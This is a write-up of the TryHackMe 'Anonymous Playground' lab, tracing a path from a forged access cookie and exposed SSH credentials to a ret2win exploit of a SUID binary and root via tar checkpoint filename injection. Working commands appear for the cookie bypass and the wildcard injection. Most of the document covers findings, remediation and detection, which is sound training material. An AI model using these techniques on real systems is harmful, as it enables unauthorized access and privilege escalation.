---
title: "TryHackMe: Anonymous Playground"
date: 2026-08-14 12:30:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - web
  - access-control
  - credential-exposure
  - ssh
  - binary-exploitation
  - suid
  - ret2win
  - tar
  - wildcard-injection
  - privilege-escalation
description: >-
  Anonymous Playground chains a client-controlled cookie bypass, exposed SSH
  credentials, a vulnerable SUID binary, and privileged tar wildcard execution
  into complete root compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_anonymous_playground
image:
  path: room_image.webp
  alt: "Original TryHackMe Anonymous Playground room artwork"
toc: true
comments: false
---

Anonymous Playground is a Linux web-to-root challenge built around weak authorization, credential exposure, binary exploitation, and unsafe privileged automation. The validated path progressed from a hidden web route and client-controlled cookie bypass to SSH access as `magna`, then used a vulnerable SUID binary to become `spooky` and a tar wildcard technique to reach root.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Anonymous Playground room card](room_card.webp){: w="303" h="270" .shadow }](https://tryhackme.com/room/anonymousplayground){: .center }

## Executive Summary

The target exposed only SSH and HTTP:

```text
22/tcp  SSH
80/tcp  HTTP
```

The validated compromise path was:

1. enumerate the exposed web service;
2. read `robots.txt` and identify the hidden route `/zYdHuAKjP`;
3. observe that the route used a client-controlled `access` cookie;
4. change the value from `denied` to `granted`;
5. recover an encoded credential string from the restricted content;
6. decode the value and authenticate to SSH as `magna`;
7. retrieve the first user objective;
8. identify the root-owned SUID binary `/home/magna/hacktheworld`;
9. exploit the unsafe `gets()` path with a ret2win payload that calls `call_bash`;
10. obtain a shell as `spooky`;
11. retrieve the second user objective;
12. create tar checkpoint option files in `/home/spooky`;
13. cause privileged automation to execute `.webscript`;
14. obtain a SUID-root shell;
15. retrieve the final root objective.

> **Result:** Unauthenticated web access was converted into complete root compromise through client-side authorization, exposed credentials, SUID binary exploitation, and unsafe tar wildcard automation.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe Anonymous Playground laboratory host.

Testing was limited to the assigned challenge target and flag objectives. Destructive activity outside the challenge requirements was excluded.

## Initial Enumeration

Representative service discovery:

```console
$ nmap \
  -p22,80 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed services:

```text
22/tcp  SSH   OpenSSH 8.2p1 Ubuntu
80/tcp  HTTP  Apache 2.4.41
```

The HTTP title was:

```text
Proving Grounds
```

## Hidden Route Discovery

`robots.txt` disclosed a disallowed application path:

```text
/zYdHuAKjP
```

Representative request:

```console
$ curl -i http://TARGET_IP/robots.txt
```

The hidden route itself set a client-side cookie:

```text
access=denied
```

## Client-Controlled Cookie Bypass

Replacing the cookie value with:

```text
access=granted
```

caused the application to return restricted content:

```console
$ curl -i \
  -b 'access=granted' \
  http://TARGET_IP/zYdHuAKjP/
```

The authorization decision was therefore controlled by a client-supplied value rather than a trusted server-side session.

## Encoded Credential Recovery

The restricted page exposed an encoded string. The exact encoded value and decoded password are not published.

Decoding produced credentials for:

```text
magna
```

The public version records the password only as:

```text
magna : [REDACTED]
```

No password brute force was required.

## SSH Foothold as magna

The recovered credential authenticated successfully:

```console
$ ssh \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  magna@TARGET_IP
```

The first user objective was located at:

```text
/home/magna/flag.txt
```

Its value is redacted:

```text
[REDACTED]
```

## SUID Binary Exploitation to spooky

Local enumeration identified the root-owned SUID binary:

```text
/home/magna/hacktheworld
```

Static inspection showed unsafe use of:

```text
gets()
system()
/bin/sh
call_bash
```

The binary contained a reachable `call_bash` function and was vulnerable to a classic ret2win-style control-flow overwrite.

The validated exploit used:

```text
offset: 72
ret gadget:  [REDACTED]
call_bash:   [REDACTED]
```

The exact addresses are omitted from the public post.

Successful exploitation yielded:

```text
uid=1337(spooky)
```

The second user objective was located at:

```text
/home/spooky/flag.txt
```

and is redacted:

```text
[REDACTED]
```

## Root Privilege Escalation Through tar Wildcards

The `spooky` home directory contained:

```text
.webscript
```

and permitted creation of filenames interpreted by GNU tar as command-line options.

The validated checkpoint files were:

```console
$ cd /home/spooky

$ touch -- '--checkpoint=1'
$ touch -- '--checkpoint-action=exec=sh .webscript'
```

Privileged automation later processed the directory. The crafted filenames caused tar to execute `.webscript` as root and create a SUID-root shell at:

```text
/home/spooky/.cache/.cachefile
```

Executing that file resulted in:

```text
uid=0(root)
```

The final objective was located at:

```text
/root/flag.txt
```

and is redacted:

```text
[REDACTED]
```

## Findings

### F-01 - Hidden Web Content Disclosed Through robots.txt

- **Severity:** Low
- **Affected path:** `/zYdHuAKjP`
- **Impact:** reduced attacker effort and discovery of restricted functionality

`robots.txt` disclosed the sensitive path directly.

**Remediation:**

- do not rely on `robots.txt` as an access-control mechanism;
- remove sensitive internal routes from public crawl-control files;
- enforce authentication and authorization server-side.

### F-02 - Client-Controlled Cookie Used for Authorization

- **Severity:** High
- **Affected control:** `access` cookie
- **Impact:** unauthenticated access to restricted content

Changing the client-controlled cookie value from `denied` to `granted` bypassed the restriction.

**Remediation:**

- enforce authorization server-side;
- use authenticated sessions or signed tokens;
- never trust unsigned client-side flags for security decisions.

### F-03 - Encoded SSH Credentials Exposed in Web Content

- **Severity:** High
- **Affected account:** `magna`
- **Impact:** direct authenticated shell access

Restricted web content exposed an encoded credential string that could be deterministically decoded.

**Remediation:**

- remove credentials from web content and source repositories;
- rotate the exposed password;
- prefer SSH keys with passphrases;
- disable password authentication where practical;
- deploy secret scanning.

### F-04 - Root-Owned SUID Binary Vulnerable to Buffer Overflow

- **Severity:** Critical
- **Affected binary:** `/home/magna/hacktheworld`
- **Impact:** privilege escalation from `magna` to `spooky`

The SUID binary used unsafe input handling and exposed a callable shell-spawning function, enabling a ret2win-style exploit.

**Remediation:**

- remove unnecessary SUID bits;
- replace unsafe input functions such as `gets()`;
- compile privileged binaries with PIE, stack canaries, RELRO, and NX;
- perform security review of privileged native binaries.

### F-05 - Unsafe Privileged Automation with tar Wildcard Execution

- **Severity:** Critical
- **Affected path:** `/home/spooky`
- **Impact:** root command execution

Privileged automation processed user-controlled filenames with tar wildcard expansion, allowing crafted option filenames to execute `.webscript` as root.

**Remediation:**

- avoid privileged tar execution over user-writable directories;
- use fixed file lists;
- pass `--` before untrusted filenames where applicable;
- store privileged automation content outside user-controlled paths;
- run automation with the least possible privilege.

### F-06 - Overly Permissive File Permissions in User Home Directory

- **Severity:** Medium
- **Affected location:** `/home/spooky`
- **Impact:** writable scripts and configuration supported the escalation chain

Files such as `.confrc` and `.webscript` had overly permissive access.

**Remediation:**

- restrict home-directory permissions;
- ensure automation scripts are root-owned and non-writable by ordinary users;
- eliminate world-writable configuration and script files;
- monitor privileged jobs that consume user-controlled files.

## Security Impact

The validated chain resulted in complete root compromise from an unauthenticated remote starting position.

An attacker with equivalent access could:

- discover hidden application paths;
- bypass client-side authorization;
- recover reusable SSH credentials;
- obtain an interactive local shell;
- exploit a privileged SUID binary;
- pivot into another local account;
- influence privileged tar automation;
- obtain arbitrary root command execution;
- access or modify all local data.

The compromise required no password spraying or speculative brute force. Each step relied on deterministic weaknesses exposed by the target.

## Detection Opportunities

Useful monitoring controls include:

- alert on requests to hidden or restricted routes revealed through crawl-control files;
- monitor unexpected `access=granted` cookie use;
- scan web content for encoded or credential-like strings;
- monitor SSH authentication using newly exposed credentials;
- alert on execution of unusual SUID binaries in user home directories;
- detect crashes or anomalous execution of privileged native binaries;
- monitor creation of filenames beginning with `--checkpoint` in user-writable directories;
- alert on creation of new SUID files under `.cache` or other user paths;
- detect root execution originating from tar checkpoint actions.

## Remediation Priorities

1. Replace client-controlled authorization with server-side enforcement.
2. Remove credentials from restricted web content and rotate the `magna` password.
3. Remove or rebuild the vulnerable SUID binary.
4. Correct permissions on `/home/spooky`.
5. Remove tar wildcard execution from privileged automation.
6. Move privileged scripts and automation inputs outside user-controlled paths.
7. Add secret scanning, SUID inventory, and privileged-job monitoring.
8. Review all hidden routes for real authentication and authorization controls.

## Retest Plan

1. Confirm `/zYdHuAKjP` does not expose sensitive functionality without authentication.
2. Verify changing the `access` cookie cannot bypass authorization.
3. Confirm no encoded or plaintext SSH credential remains in web content.
4. Verify the previous `magna` credential no longer authenticates.
5. Confirm `/home/magna/hacktheworld` is removed, hardened, or no longer SUID.
6. Verify the prior ret2win path no longer produces a `spooky` shell.
7. Confirm `/home/spooky` scripts and configuration are not broadly writable.
8. Verify crafted tar checkpoint filenames are treated only as filenames.
9. Confirm privileged automation cannot execute `.webscript`.
10. Verify the previous attack chain no longer reaches root.

## Lessons Learned

Anonymous Playground demonstrates how weak authorization, secret exposure, native-code flaws, and unsafe automation can combine into a complete compromise.

A hidden route was easy to discover, authorization trusted a mutable cookie, exposed content contained recoverable credentials, a SUID binary provided a deterministic local escalation, and tar wildcard processing finally collapsed the root boundary.

The strongest defensive response is to treat web authorization, credential hygiene, SUID binaries, home-directory permissions, and privileged automation as one connected trust boundary.
